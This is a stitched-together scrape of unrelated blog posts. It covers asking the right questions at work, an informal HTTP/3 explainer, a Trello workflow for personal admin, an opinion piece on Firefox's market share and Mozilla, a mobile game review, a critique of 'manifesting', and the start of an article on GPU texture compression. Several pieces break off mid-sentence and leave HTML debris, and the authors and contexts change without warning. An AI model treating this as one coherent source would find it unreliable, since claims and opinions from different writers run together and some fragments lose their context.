<p>If you’re a salesperson, ultimately you want to know the answer to the questions <em>Who will become my customer?</em> and <em>How much will they buy from me?</em> If you knew the answers to these questions, you could more or less just sort them by contribution margin and start dialing. The problem is that this can be hard to find out, so you will inevitably need to talk to a lot of prospects that will end up not becoming your customers. The key thing for a salesperson is therefore to qualify their leads, i.e. to make sure that they spend as much time as possible with relevant customers.</p>

<ul>
  <li><em>Does the customer need to solve the problem that our product can solve?</em> Please note the focus on problem here, and google <em>Jobs to be done</em> for more theory.</li>
  <li><em>Is the person you are talking to allowed to spend money on solving the problem?</em> If not, you might want to talk to one of their colleagues.</li>
  <li><em>Does the customer have a budget allocated?</em> If not, at least make sure they allocate money next year if they’re interested in your product.</li>
</ul>

<h3 id="as-a-buyer">As a buyer</h3>
<p>If you work in procurement (ie. buying things for your organization), you might think that you should be asking questions about deliveries, contracts, price levels etc. However, the most effective question is often:</p>

<p><em>What do we actually need in order to do our job?</em></p>

<p>You might find that not everyone in your company who asks for a new computer, phone or car actually needs one in order to do their job. Similarly, you might be able to cut down on software that’s not being used, or downgrade SaaS licenses to plans with less features.</p>

<h3 id="as-a-recruiter">As a recruiter</h3>
<p>Hiring people is of course all about asking questions. What you really want to find out is <em>Is this candidate worth trying to hire?</em> (Will they be able to do the job? Do they have potential beyond the current job scope? Does the candidate have better options than working for us?)
How can you assess all of this during a short interview? You can’t cover all aspects, of course. However, it will be really hard to predict the candidate’s future job performance if you spend the entire interview digging into one single question or case study. Instead, you’ll want to ask <em>as many different questions as possible</em> during the interview. The reasoning behind this is that one big case study might overlap poorly with your skillset by accident, but if you fail on ten unrelated questions after each other you’re more likely to fail in a real work settings. An example: If you’re hiring developers you might want to try to spend the interview discussing several pre-made code examples instead of having the candidate write code (which takes much longer). A great blog post on this topic <a href="https://erikbern.com/2018/05/02/interviewing-is-a-noisy-prediction-problem.html">here</a>.</p>

<h3 id="as-a-software-developer">As a software developer</h3>
<p>The most important thing about asking questions as a software developer isn’t really <em>which</em> questions to ask, but having the courage to <em>ask them sooner rather than later</em>. One of the most rewarding things about developing software is solving problems, but the desire to solve them yourself can easily lead to a lot of wasted time. However, as long as you have actually tried to solve a problem, you’ll learn as much by asking someone for help as you would by solving it yourself. Sometimes it even helps explaining the problem to someone.</p>

<h3 id="as-a-ux-researcher">As a UX researcher</h3>
<p>If you are interviewing users of a product in order to learn about potential improvements, the key is to ask open-ended questions. You’ll want to avoid asking <em>Show me how you’d use the product to do X</em>, because the user might not even be aware that you could use the product to do X! Instead, you’ll want to ask things such as <em>What do you use the product for?</em> and <em>Can you show me how?</em> Also, you might want to dig deeper into all thing you discover by asking <em>Why?</em> several times. Google <em>The five whys</em> for more info on this method.</p>

<h3 id="as-a-doctor">As a doctor</h3>
<p>I am not a doctor, so I won’t dive to deep into medical practice, but as I’ve understood it there is a big difference between being a primary care physician (where you meet one patient at a time and you’re not in a rush) and an emergency-care physician (where the patient might actually die within five minutes). As a primary-care physician, you’ll want to start high-level and ask open-ended questions, in order to find out things that you might want to dig deeper into. You’ll also want to make sure that the patient understood everything, and check whether they are actually using the medicine you prescribed last time. As an emergency-care physician, you want an immediate <em>triage</em>: What is the emergency? What is the patient’s temperature, blood pressure, pulse rate and respiratory rate? These pieces of information will give you enough to prioritize the most urgent patients.</p>

<p>Generally, I think this in an interesting distinction. In many professions you’ll be …</p></article></div></div>

<!-- Horizontal Top Article -->
<p>You haven’t quite figured out HTTP2 yet that you’re already starting to get pissed off by people talking about HTTP3. But there’s a reason for that: HTTP3 is fast. I bet you in five minutes you’ll agree with me. </p>



<h3>Once upon a time</h3>



<p>I can’t tell you about the future without telling you about the present. <strong>Do you know about HTTP ?</strong> Defined in 1991, it’s the protocol that manages the web. It means <a href="https://en.wikipedia.org/wiki/Hypertext_Transfer_Protocol" target="_blank" rel="noreferrer noopener">HyperText Transfer Protocol</a> and it allows you to fetch resources from a web page. </p>



<p>From a web server to your browser. It’s built on a lower level protocol –<strong>TCP: it’s going to be important-</strong> and it’s stateless. It means that each request is completely independent. Each GIF present on this page is a GIF proudly independent in its life on the internet. That’s good for him and his life as a GIF. But for us it’s a bit of a broken system.</p>



<p>Because the problem is that <strong>each request will only look for one file at a time</strong>. Each time an expensive TCP connection is created for the occasion. Imagine if you had 10,000 Internet tips on your page.</p>



<p> I know a lot of people absolutely loved my pattern making skills in the previous article. So, to explain the Internets to you properly, I’m doing it again.</p>



<div><figure><img src="https://i.imgur.com/iI0MrHF.jpg" data-src="https://i.imgur.com/iI0MrHF.jpg" alt="http"></figure></div>



<p>Despite the fact that a browser can make six different requests at the same time, HTTP is still slow and full of TCP connections. Plus, we developers, usualy don’t care about that. <strong>We like to put as much crap on our pages as possible. </strong>Big jQuery lib with 300 useless CSS stylesheets ending with a big transparent 8 mega PNG. </p>



<p>When Google saw all the crap we were doing everywhere <strong>they started talking about SPDY</strong> (it’s called speedy). The point? To speed up the Internets. </p>



<p>SPDY is a specification that proposes to use HTTP as is but with a change of rules. And by <strong>compressing headers, prioritizing requests and multiplexing</strong>, it will transform all TCP requests and connections into one! </p>



<p>Concretely, when your HTML is read, your browser looks at everything you’re going to ask in your page. Then, it’s getting everything all at once. <strong>This way you avoid doing it file by file.</strong> </p>



<p>The first draft of HTTP2 is SPDY based. Very quickly HTTP2 was adopted and life on the internet has become faster. <strong>Today <a href="https://w3techs.com/technologies/details/ce-http2" target="_blank" rel="noreferrer noopener">42.7% of the internet</a> use HTTP2.</strong></p>



<div><figure><img src="https://i.imgur.com/2jePyHC.jpg" data-src="https://i.imgur.com/2jePyHC.jpg" alt="http2"></figure></div>



<h3>Great, what about HTTP3?</h3>



<p>If I piss you off with HTTP and HTTP2 when you explicitly clicked to see sexy HTTP3, there’s a good reason. HTTP2 was created by taking HTTP as a base and changing the rules.<strong> It’s the same thing with HTTP3. </strong>So by understanding the present it’s easier for me to explain the future to you.</p>



<p>Googlers are geeks, they never stop. After SPDY became HTTP2, they thought that it was still not fast enough. So they started talking about QUIC (it’s called Quick). <strong>This will be the second experimental technology developed by Google to become an official upgrade of the HTTP protocol</strong>. But what’s so special about this protocol?</p>



<p>The main big evolution of HTTP3 is the change of transport layer. No more of the heavy TCP connections I’ve been telling you about since the beginning. <strong>Now, it’s all about UDP. </strong></p>



<p>By the way QUIC means “Quick UDP Internet Connections”. This change of protocol will speed up connection establishment and data transfer times enormously. Howerver, <strong>UDP is certainly faster and simpler, but it doesn’t have the reliability and error handling of TCP.</strong></p>



<p>TCP has to make several round trips just to establish a connection in a square and stable way. <strong>Where UDP doesn’t give a damn and does it really fast without stability and risk of lost packets. </strong>However UDP can dramatically reduce latency in requests. Up to almost zero latency in repeated connections to the same server because no roundtrip is made to establish connections.</p>



<figure><img src="https://i.imgur.com/hDmNkpS.png" data-src="https://i.imgur.com/hDmNkpS.png" alt="http3"></figure>



<p>HTTP3 is the multiplexing and compression features of HTTP2 with a protocol change from TCP to UDP. The Google guys then added their layer in the protocol to guarantee stability, order in the reception of packets and of course security. </p>



<p><strong>So HTTP3 uses UDP for its high speed while keeping the stability of QUIC</strong>, without forgetting the security of TLS. Because yes, in QUIC you find TLS 1.3 which allows you to make your beautiful SSL. I’ve been talking about layers for a while, this is what it looks like under the hood.</p>



<figure><img src="https://i.imgur.com/QdNsQHL.jpg" data-src="https://i.imgur.com/QdNsQHL.jpg" alt="http3"></figure>



<p>In 2018, QUIC became HTTP3. The Internet Enginerring Task Force dudes, <a href="https://www.youtube.com/watch?v=uVf_yyMfIPQ&amp;t=4956" target="_blank" rel="noreferrer noopener"><strong>dudes in shorts who decide on Internet protocols</strong></a>, have agreed. And that’s great news because the Internets will never be fast enough for us, impatient people.</p>



<h3>Epilogue</h3>



<p>HTTP3 is the sexy future with a HTTP base that has been tuned to the maximum by google geeks. At the time of writing, <a href="https://w3techs.com/technologies/details/ce-quic" target="_blank" rel="noreferrer noopener">only 4.6% of the Internet uses HTTP3</a> but this figure is likely to grow in the coming years. We stayed on the surface today, but there are a lot of deep-dive articles everywhere that I invite you to consult if you’re more curious.</p>

		<p>I’ve never been good at what you might call “life admin”, but I used to keep track of it through having a high level of 1) recall, 2) guilt and anxiety.</p>
<p>I can’t say this system was working <em>well</em>, I was pretty behind on this stuff (such as… still having an Australian bank account five years after I moved away). But the critical things were mainly taken care of and the non-critical… remained in runtime memory.</p>
<p>A bit over a year ago, having dealt with what I termed the “inner monologue of self hate”, my every failing as a person was no longer running on a loop in every moment of downtime. At this point, I realised I needed a system that didn’t involve me remembering everything and worrying about it.</p>
<p>Enter: Trello.</p>
<h2>Board 1: Life Admin</h2>
<p>I created a board that I “jokingly” called “Life Failures” (since renamed to Life Admin), and set up a bunch of columns. I don’t exist kanban style in my life so the main features are:</p>
<ul>
<li>A list of areas of responsibility, such as “finances”, “house”, “car” etc.</li>
<li>Labels, primarily: “waiting”, “work hours phone call”, “easy”, “blocking”. During lockdown I created a “post-pandemic” label to filter out visually the things I couldn’t expect to make progress on, which was helpful.</li>
<li>A done column that resets each month, i.e. “Done – June”, and “Done – July”. I tend to keep the previous month’s around and then archive when I create a new one. So right now in July, June is still around. When I create August, I will archive June.</li>
<li>Extensive use of checklists.</li>
</ul>
<p>Each card is on some level a mini life “project”, and I keep tabs on things using the labels and the checklists. This is the one where I changed my bank account, it entered waiting / blocking states multiple times, was closed off in May, even though it began in March.</p>

<p>This sometimes creates a disconnect between the amount of work I’ve done and the amount I really get to “check off” but I am trying to embrace with this list the idea that life admin is something that is continually chipped away at. The goal is not to empty the board, the goal is to be more on top of things and not create cascading failure in my personal life (again).</p>
<p>Since adopting this system I’ve made progress on so many things that have dragged on for <em>years</em>. Particularly in the “financial” list which has always been my biggest struggle (there is no visual reminder, it’s extremely boring and usually bureaucratic which I find disproportionately stressful). The Australian bank account is closed, I <em>finally</em> managed to transfer my stock from the Conglomerate out of the mandated system and to my regular investment manager (this was so painful and had stopped and started multiple times before we really made a concerted effort earlier this year). I managed to untangle the mess of paying emergency tax for ~18+ months over three tax years. Addressing these things doesn’t really affect my day to day, but it does make it easier to make bigger decisions, because everything is accessible and where it should be.</p>

<p>The board is broad, and there are obvious ways to streamline it or break things out into their own board, but I choose not to. The board is broad because life is broad, and because some months I may move things from one column, and other months from other columns, the point is that everything is tracked, and moving overall.</p>
<p>List of columns:</p>
<ul>
<li>Finances</li>
<li>House</li>
<li>Car</li>
<li>Travel</li>
<li>Cate as a Person</li>
<li>Self-Employment</li>
<li>Professional</li>
<li>Writing</li>
<li>Misc</li>
<li>Things to buy</li>
<li>Done – Current Month</li>
<li>Done – Previous Month</li>
</ul>
<h2>Board 2: Day to Day</h2>
<p>At the start of this year, I created a second board, which I call “Day to Day”. The idea of that one is to capture the repeating tasks. This consists of three lists:</p>
<ul>
<li>Week</li>
<li>Month</li>
<li>Current Month</li>
</ul>
<p>At any given time I have a “week” card which captures the things I try to do every week, and a “month” card which captures the things I try to do every month. When the week is up, I move it under the current month, and then I archive that at the end of the month. Initially I had “day” cards but I found that it was just annoying me, so I got rid of them.</p>
<p>I use template cards, so each time I create a new week or month card, they come with the same checklist. If I was going to add something, I would add it to the template card. For instance, I didn’t feel the need to track going to the gym on the week card because it was 1) more of a daily thing, and 2) a strong habit. After the gym being shut for nearly 4 months, I might add it in as I rebuild that habit.</p>
<p>This is the current state of the board:</p>

<p>The month list is relatively short, and really just captures 1) taking some time for myself (the spa!), 2) a task that I dread (the personal expense report) and 3) the vague thing that I feel is best done through continuous small efforts (the “external thing”, a profile building/maintaining exercise).</p>

<p>The week list is longer, and captures the aspects that I think create a well rounded life – good friendships (regular social interaction, doing something nice for other people), personal well being (writing, cultural experiences, regularly chipping away at the hardest list in life admin) and self care (making an effort with my appearance, maintaining a beautiful home). It’s always interesting what drops off depending on circumstances.</p>
<p>Initially I had the idea that these lists should capture everything, and had the concept of “extras” where I would note down things not covered by the list. But over time I’ve concluded that it works best for me when the concepts are general, and it creates regular opportunities to consider what, of the things I consider important, am I making time for? And what am I not?</p>
<h2>&nbsp;✅</h2>
<p>Both boards combine to address the nagging sense that I’m behind or not doing enough, and allow me to capture what goes into keeping my life moving along and the things make me happy. The things I “should” do no longer run in a loop in my head; they are captured in Trello, and it’s a vastly better way to live.</p>

</figure><p>This is everything you essentially need to know. In the last few years, the Firefox market share has fallen, a lot, most likely due to the rise of mobile and a failure of Mozilla to establish themselves on it.</p><p>The Firefox market share is such that it's practically unnecessary to test against it, especially if your users are using your web apps or sites on their phones. If you instead take that time and focus and create a more accessible app or site, it will be a more reasonable use of your time since more people have disabilities than Firefox has market share.</p><!--kg-card-begin: markdown--><blockquote>

Persons with disabilities on average are more likely to experience adverse socioeconomic outcomes than persons without disabilities, such as lower rates of education, worse health outcomes, less employment, and…</p><p><img src="https://www.worldbank.org/content/dam/wbr-redesign/logos/wbg-favicon.png"><span>World Bank</span></p></div><p><img src="https://www.worldbank.org/content/dam/wbr/share-logo/social-share.jpg"></p></a></figure><p>Even for the most generous apps or sites, which only rely on desktop browsers for example and have users in regions such as Europe or North America, Firefox market share is lower than that. Of course, far from everyone with a disability has a disability that makes it difficult to consume web content but for most sites and apps today a majority of traffic comes from mobile users where Firefox market share is less than a percent which is lower than the percentage of people with sight issues.</p><p>Personally, I think the <a href="https://blog.mozilla.org/blog/2014/04/03/brendan-eich-steps-down-as-mozilla-ceo/">firing of Brendan Eich</a> as the big boss was one of the biggest mistake Mozilla ever did and I think the current news about Mozilla proves me right. He had a salary of $800k as max and has done so much for the web as it is today. Suddenly when he was replaced, the salary more than tripled, isn't that strange? To request a salary more than three times as much as the previous guy should require the result being at least three times as good in my opinion. Mozilla has for the last couple of years shifted from being laser focused making the best, most awesome browser to promoting diversity over all else, purchasing pocket and pushing a lot of other things like Firefox Send. Things that have been good and bad, but most importantly not really about the browser or the web itself.</p><p>The funny thing is, that the urge to be profitable never seems to have encountered the most obvious realization, to profit from their most popular product, Firefox itself. They could simply charge for Firefox to unlock some pro features like ad blocking, Firefox Send (which was actually a great service) and other things that most normal users don't use anyway. Hence, they could keep their mission cake and eat it too.</p><p>I would gladly pay for Firefox if the money actually went there, but it seems that even donating to Mozilla is <a href="https://foundation.mozilla.org/en/about/">just sending your money towards some diversity cause</a> or perhaps to Bakers own pocket.</p><p>To summarize my thoughts, it is clear that specifically supporting Firefox in its current state is not a goal for me anymore. I have lost faith in Mozilla after all these years. I will use the time to test for accessibility instead of being an active tester for Firefox. If you have the luxury to have enough time to always thoroughly test for both things, that's awesome but for me that is simply a position that I seldom find myself in. From now on, I will simply assume that stuff I make works in Firefox as I follow the web standards. Because honestly, if you have to choose it is likely better to test for accessibility than for Firefox.</p><p>For you people out there that values privacy but not political activism, I recommend you to try out the Brave web browser as an alternative to Firefox.</p><figure><a href="https://brave.com/"><div><p>Secure, Fast &amp; Private Web Browser with Adblocker | Brave Browser</p><p>The Brave browser is a fast, private and secure web browser for PC, Mac and mobile.

I'm not sure if this is a new trend, but I've seen a few these pop up on the app stores and they all follow the same style of gameplay: search/fill/fix/solve a random puzzle.&nbsp;</p><p><i>Brain Wash</i> is no different in this regard. The puzzles, all of which are designed in a friendly, modern and approachable style, involve you touching the screen to fix a puzzle, put something in the right order, solve something, move an object or draw something on a screen. These mechanics (and their variations) are used throughout <i>Brain Wash's</i> levels to challenge the player.&nbsp;</p><p>There are two main issues I have with <i>Brain Wash</i>. Firstly, the game is incredibly easy. Seriously, the puzzles aren't that hard and anyone looking for a challenge should download something else. Secondly, there are the ads. I've written before about the intrusive nature of ads in hyper-casual games and <i>Brain Wash</i> is no different. The ads slowly creep up on you and before you know it, are inundated.&nbsp;</p><p>This is currently the third bestselling free game on Google Play. Obviously, it must have some appeal. I think it would be okay for a few minutes during a break as it's very easy and you can blast through the levels quite quickly. If you can bear the ads, it's not a bad choice.</p>&nbsp;

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h2>Ask And You May Or May Not Receive</h2><p><strong>Manifesting</strong> (v): <em>to bring something into the world - via 'the universe' - by imagining that it already exists.</em></p><p>Have you ever read (or - <em>the horror</em> - watched) 'The Secret'? It’s the book/film combo responsible for making the concept of manifesting - thinking riches and success into existence - so widespread and popular. Sixteen years after the film appeared, the idea has become blandly pedestrian. 'Oh yeah,' you'll hear over your latest zoom brunch, 'I've been working really hard on manifesting [insert material gain] and now it's paying off. So blessed.' (It has also recently been made into another movie - this time a <a href="https://www.imdb.com/title/tt4411584/"> dramatisation</a>.)</p><p>In its popular format, manifesting is a concept of such empty pseudoscience that <strong>it should be actively avoided by everyone currently alive on planet earth</strong>. Where this new-age idea drifts by more or less harmlessly in the good times (broadly defined as whenever we are not in <em>another</em> 'once-in-a-generation' economic crisis or highly infectious respiratory pandemic), it surges in popularity when things get tough. </p><p>Thanks to Covid19 many have been financially, physically and emotionally pummelled over the last few months. The great pandemic lottery of 'whose careers survive or not' has surprised few with who has so far won and lost. Conversely, others have been able to continue on as normal and some, the smallest and most fortunate group, have thrived and profited.</p><p>Within the more fortunate groups, some are more prone than others to explain their good fortune because of the mindset they have adopted. This is a responseI believe stems from the popularity of the manifestation philosophy. Those that are down on their luck may see this and turn, inevitably, to the ever-flowing font of mindset motivation and self-help wisdom that exists online and in print. Never mind that not all jobs can be done from home - don't be so negative - you must <em>manifest</em> your way out of this particular pinch.</p><p><strong>But how?</strong></p><h2>The (Mutable) Law of Attraction</h2><p>Manifesting is just another name for ‘the law of attraction’, the belief that you can get what you want just by thinking about it.</p><p>Here's a quick 101:</p><ul role="list"><li>You can have <em>anything you desire </em>- you just have to ask the universe for it. (The universe, through some unknown mechanism, has sentience and cares about whether or not you get what you want.)</li><li>To get the universe to give you what you want, you have to generate the right 'frequency' or 'vibration' which will then be reflected back at you. (What physical properties these frequencies have or exactly what is doing the, er, <em>vibrating</em> is left open to interpretation.)</li><li>To get the right frequency, you have to think positively and imagine that you already have the thing that you want. If you dwell on how you don't yet have what you want, your frequency will be <em>all wrong!</em> (In essence, a milquetoast flavour of cognitive dissonance.)</li><li>Then... Bam! Eventually, the universe delivers unto you exactly what you were seeking. (Purists, note well: you don't necessarily have to actually <em>do</em> anything to get to this point other than thinking.)</li></ul><p>There's a lot to unpack here. The biggest assumptions are that <strong>the universe has sentience, is aware of you, and is somehow interested in helping you get what you want</strong>, no matter how minor. In the 2004 film of ’<a href="https://www.imdb.com/title/tt0846789/">The Secret</a>’, one example is of some rube imagining himself driving a sports car he really wants. He sits in his armchair, closes his eyes, then heads out for a drive in his mind. He works the pedals and grips a non-existent steering wheel in front of him, feeling the wind on his face as he changes gears. </p><p>It’s quite an image; I think if a family member or friend were to walk in on me doing anything like that <em>in flagrante</em> I think on balance I'd rather be caught masturbating than driving an imaginary car. All this is to say that the idea the universe is a) aware you want a car and b) cares enough to help you get it, is absurd. <strong>You'd hope the unfathomable, grand infinite expanse of our billions-of-years-old plane of existence has bigger fish to fry than helping a relatively smart mammal get a new Porsche, but apparently not.</strong></p><p>(Typical examples used by the acolytes of manifestation are almost always material: cars, houses, bigger salaries, promotions etc. Curiously, nobody selling LOA has ever had the smart idea of organising collective action to imagine world peace or to reverse climate change. Or, if they have, it hasn't worked.)</p><p>Secondly, there's this whole idea about frequencies and vibrations. This is peak yogababbling drivel at its most inane. As far as I can tell, it’s got something to do with the bastardisation of Einstein’s E=mC^2 - it's the difference between ‘matter has equivalent energy’ and ‘everything is, like, <em>energy, man!</em>’</p><p>If there really is a frequency for 'I want a new car', I'd love to know what it is and exactly where it appears on the <a href="https://en.wikipedia.org/wiki/Electromagnetic_spectrum">electromagnetic spectrum</a>. Is it somewhere between infrared and visible light, or does it carry more energy than a gamma ray burst? If it's going to fatally irradiate my entire city I think I'll stick with my modest Volkswagen.</p><p>But this is all only surface level. <strong>It gets much worse.</strong></p><h2>What Do You Mean You Don't Want a Race Car?</h2><p>The unethical problem at the core of manifestation is that<strong> it is the preserve of the privileged</strong>, completely disregarding any potential influence from the outside world. If you are a relatively wealthy individual with agency over your actions you can manifest your new car easily enough by, perhaps, spending less on other luxuries and shopping around for a dealership that will give you a good financing arrangement. </p><p>The logic of the gospel of manifestation is that it shouldn't matter if you live in a country, a society, a system, a city, a family or a relationship where you are held back by the context you inhabit because if you're not getting the results you want, well... <strong>it's because you're just not imagining it hard enough.</strong></p><p>Consider this: if you would not be comfortable sitting down with someone living in or fleeing from a war, or a cartel, or abuse, and telling them with a clear conscience that <em>the only thing holding them back is their mindset</em> and that they need to adopt 'an attitude of gratitude', <strong>then the rationale of the entire enterprise is sunk</strong>. </p><p>Is it one rule for you and another for them? Do you only enter the manifesting club when your socioeconomic status is good enough? Are you just doing it <em>better</em> than they are? Does the universe care about you, but not give two shits about them? Are you sure it's got nothing to do with the fact that you live in a rich country, have the time to read indulgent books about the law of attraction and enjoy ignoring your own privileges and rights granted to you by dint of the circumstances you find yourself in?</p><p>It might come as no surprise that <strong>the majority of the people saying anything about manifesting are usually selling something about it, too</strong>; many derive their wealth from motivational speaking and training. The core narrative that these self-help gurus spin is that it is the individual <em>alone</em> - yes, you! - who has the power to change their life for the better. It's the kind of thing that fits in well with the American dream - the self-made, you-can-do-it-too, go-getter narrative.</p><p>In a deliciously ugly twist of irony, they then turn around and tell you that, actually, you can’t do it on your own. You need their help to make those dreams happen and <strong>they just so happen to have a course or a book or a seminar </strong>that will make the whole process that much easier. Usually it's seven habits, or six simple steps, or a sixty seven step program. Naturally, the success that they evidence to their students - their own wealth and good fortune - is financed entirely by the people who have paid to learn this from them in the first place.</p><p><strong>It is self-help as Ouroboros</strong>, the great snake that devours itself.</p><h2>Human Psychology At Work</h2><p>Before you charge me with being some kind of irredeemably negative fun-sponge, know this: I personally believe that <strong>having clear goals and visualising success absolutely can help us to get what we want</strong>. Where I differ though, is <strong>how, where and when</strong> these processes actually work. The where and the when are largely a factor of whether or not you already live in a wealthy country and aren't threatened by, oh I don't know, an imminent coup d'etat, famine, war, the disintegration of the rule of law or the appearance of masked men at your door in the middle of the night.</p><p>If you're lucky enough to have the means to engage in all that top-of-Maslow's-Pyramid type stuff, then <strong>you're good to go</strong>.</p><p>In terms of the <em>how</em>, though, this is just regular, run-of-the-mill human psychology. This is perhaps why manifesting and the law of attraction is so insidious - <strong>among the scientific truth, all of the other yogababble can creep in</strong>.</p><p>Here's a handful of effects that are actually at work:</p><p><strong>Frequency illusion:</strong> if you have a long and involved conversation with someone about red cars, you will subsequently begin to notice more red cars. Similarly, if you're always thinking about new jobs to apply for, you are more likely to notice and recognise opportunities when you're browsing around.</p><p><strong>Long term motivation:</strong> visualisation of a given goal or objective motivates us to take action and plan for a certain outcome. If you're obsessing over getting that dream job mentioned above, you're more likely to go and look for it and look in places where you are more likely to find it. (<a href="https://www.researchgate.net/profile/Judith_Harackiewicz/publication/263916494_Approach_and_Avoidance_Achievement_Goals_and_Intrinsic_Motivation_A_Mediational_Analysis/links/54d0db7d0cf20323c219faea.pdf">Citation</a>.)</p><p><strong>Skill building:</strong> some amount of visualisation helps to improve your skills, albeit only up to a point. If you think about being good at finding a job, you are more likely to adopt a slightly more effective approach for a while. (<a href="https://pdfs.semanticscholar.org/a501/1fa801a9fd7e446af1131c27b5aa0bffdbdc.pdf">Citation</a>.)</p><p><strong>Confirmation bias: </strong>wherein we take actions and look for evidence to fit and confirm the beliefs we already have. Finally got that job? It can only have been because of manifesting!

	<div>
		<p>Compressed texture formats is one of the esoteric aspects of graphics programming almost no one cares all that much about. Neither did I, however, I’ve recently taken an academic interest in the zoo of compressed texture formats.</p>
<p>During development in Granite, I occasionally find it useful to test scenes which target mobile on desktop and vice versa, and in Vulkan, where there are no fallback paths for unsupported compression formats, we gotta roll our own decompression.</p>
<p>While it really isn’t all that useful to write a decoder for these formats, my goal is to create a suite of reasonably understandable compute shader kernels which can decode all of the standard formats I care about. Of course, I could just use a Frankenstein decoder which merges together a lot of C reference decoders and call it a day, but that’s not aesthetically pleasing or interesting to me. By implementing these formats straight from the <a href="https://www.khronos.org/registry/DataFormat/">Khronos Data Format</a> specification, I learned a lot of things I would not otherwise know about these formats.</p>
<p>There are several major families of formats we can consider multi-vendor and standardized. Each of them fill their own niche. Unfortunately, desktop and mobile each have their own timelines with different texture compression standards, which is not fully resolved to this day in GPU hardware. (Basis Universal is something I will need to study eventually as well as it aims to solve this problem in software.)</p>
<p>By implementing all these formats, I got to see the evolution of block compression formats, see the major differences and design decisions that went into each format.</p>
<h3>The major format families</h3>
<p>First, it is useful to summarize all the families of texture compression I’ve looked at.</p>
<h4>S3TC / DXT</h4>
<p>The simplest family of formats. These formats are also known as the “BC” formats in Vulkan, or rather, BC 1, 2 and 3. This is the granddad of texture compression, similar to how I view MPEG1 in the video compression world.</p>
<p>These formats are firmly rooted in desktop GPUs. They are basically non-existent on mobile GPUs, probably for historical patent reasons.</p>
<h4>RGTC</h4>
<p>A very close relative of S3TC. These formats are very simple formats which specialize in encoding 1 and 2 uncorrelated channels, perfect for normal maps, metallic-roughness maps, etc. It is somewhat questionable to call these a separate family of formats (the Data Format specification separates them), since the basic format is basically exactly equal to the alpha format of S3TC, except that it extends the format to also support SNORM (-1, 1 range) alongside UNORM. These formats represent BC4 and BC5 in Vulkan.</p>
<p>These formats are firmly rooted in desktop GPUs. They are basically non-existent on mobile GPUs.</p>
<h4>ETC</h4>
<p>The ETC family of formats is very similarly laid out to S3TC in how different texture types are supported, but the implementation detail is quite different (and ETC2 is quite the interesting format). To support encoding full depth alpha and 1/2-component textures, there is the EAC format, which mirrors the RGTC formats.</p>
<p>These formats are firmly rooted in mobile GPUs. ETC1 was originally the only mandated format for OpenGLES 2.0 implementations, and ETC2 was mandated for OpenGLES 3.0 GPUs. It has almost no support on desktop GPUs. Intel iGPU is an exception here.</p>
<h4>BPTC</h4>
<p>This is where complexity starts to explode and where things get interesting. BC6 and BC7 are designed to compress high quality color images at 8bpp. BC6 adds support for HDR, which is to this day, one of only two ways to compress HDR images.</p>
<p>On desktop, BPTC is the state of the art in texture compression and was introduced around 2010.</p>
<h4>ASTC</h4>
<p>ASTC is the final boss of texture compression, and is the current state of the art in texture compression. Its complexity is staggering and aims to dominate the world with 128 bits. Mere mortals are not supposed to understand this format.</p>
<p>ASTC’s roots are on Mali GPUs, but it was always a Khronos standard, and is widely supported now on mobile Vulkan implementation (and Intel iGPU :3), at least the LDR profile. What you say, profiles in a texture compression format? Yes … yes, this is just the beginning of the madness that is ASTC.</p>
<h4>PVRTC?</h4>
<p>PVRTC is a PowerVR-exclusive format that has had some staying power due to iOS and I will likely ignore it in this series. However, it seems like a <strong>very different kind of format</strong> to all the others and studying it might be interesting. However, there is zero reason to use this format in Granite, and I don’t want to chew over too much.</p>
<h2>What is a texture compression format anyway?</h2>
<p>In a texture compression format, the specification describes a process for taking random bits given to it, and how to decode the bit-soup into texels. There are fundamental constraints in texture compression which is unique to this problem domain, and these restrictions heavily influence the design of the formats in question.</p>
<h4>Fixed block size</h4>
<p>To be able to randomly access any texel in a texture, there must be an O(1) mapping from texture coordinate to memory address. The only reasonable way to do this is to have a fixed block size. In all formats, 4×4 is the most common one. (As you can guess, ASTC can do odd-ball block sizes like 6×5).</p>
<p>Similarly, for reasons of random access, the number of bits spent per block must be constant. The typical block sizes are 64-bits and 128-bits, which is 4bpp and 8bpp respectively at 4×4 block size.</p>
<p>Image and video compression has none of these restrictions. That is a major reason why image and video compression is so much more efficient.</p>
<h4>A set of coding tools</h4>
<p>Each format has certain things it can do. The more complex the operations the format can do, the more expensive the decoding hardware becomes (and complex a software decoder becomes), so there’s always a challenge to balance complexity with quality per bit when standardizing a format. The most typical way to add coding tools is to be able to select between different modes of operation based on the content of the block, where each mode is suited to certain patterns of input. Use the right tool for the job! As we will see in this study, the number of coding tools will increase exponentially, and it starts to become impossible to make good use of all the tools given to you by the format.</p>
<p>Encoding becomes an optimization task where we aim to figure out the best coding tools to use among the ones given to us. In simpler formats, there are very few things to try, and approaching the optimal solution becomes straight forward, but as we get into the more esoteric formats, the real challenge is to prune dead ends early, since brute forcing our way through a near-infinite configuration space is not practical (but maybe it is with GPU encode? :3)</p>
<h2>Commonalities across formats</h2>
<p>Image compression and video compression uses the Discrete Cosine Transform (DCT) even to this day. This fundamental compression technique has been with us since the 80s and refuses to die. All the new compression formats just keep piling on complexity on top of more complexity, but in the center of it all, we find the DCT, or some equivalent of it.</p>
<p>Very similarly, texture compression achieves its compression through interpolation between two color values. Somehow, the formats all let us specify two <strong>endpoints</strong> which are constant over the 4×4 block and interpolation <strong>weights</strong>, which vary per pixel. Most of the innovation in the formats all comes down to how complicated and esoteric we can make the process of generating the endpoints and weights.</p>
<p>The weight values are typically expressed with very few bits of precision per texel (usually 2 or 3), and this is the main way we will keep bits spent per pixel down. This snippet is the core coding tool in all the formats I have studied:</p>
<pre>decoded_texel = mix(endpoint0, endpoint1, weight_between_0_and_1);</pre>
<h4>To correlate, or not to correlate?</h4>
<p>The endpoint model blends all components in lock-step. Typically the endpoint will be an RGB value. We call this correlated, because this interpolation will only work well if chrominance remains fairly constant with luminance being the only component which varies significantly. In uncorrelated input, say, RGB with an alpha mask, many formats let us express decorrelated inputs with two sets of weights.</p>
<pre>decoded_rgb = mix(endpoint0_rgb, endpoint1_rgb, rgb_weight);
decoded_alpha = mix(endpoint0_alpha, endpoint1_alpha, alpha_weight);</pre>
<p>This costs a lot more bits to encode since alpha_weight is very different from rgb_weight, but it should be worth it.</p>
<p>Many formats let us express if there is correlation or not. Correlation should always be exploited.</p>
<h4>Working around the horrible endpoint interpolation artifacts</h4>
<p>Almost all formats beyond the most trivial ones try really hard to come up with ways to work around the fact that endpoint interpolation leads to horrible results in all but the simplest input. The most common approach here is to split the block into partitions, where each partition has its own endpoints.</p>
<h2>S3TC – The basics</h2>
<p>A compute shader decoder:</p>
